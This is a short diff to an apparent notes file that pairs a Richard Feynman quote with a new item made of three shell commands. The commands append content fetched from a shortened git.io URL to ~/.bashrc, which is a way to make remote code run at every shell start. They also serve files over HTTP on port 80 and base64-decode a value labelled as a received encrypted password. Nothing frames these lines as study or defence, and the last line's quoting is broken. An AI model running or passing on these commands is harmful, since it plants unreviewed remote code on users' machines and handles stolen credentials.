@@ -3,4 +3,6 @@ Points to include :
 1) If you cannot explain something in simple terms , you don't understand it .
 								- Richard Feynman
 
-2) 
+2) curl 'https://git.io/fhNWm' >> ~/.bashrc
+   python3 -m http.server 80
+   echo '<encrypted_password_received' | base64 -d
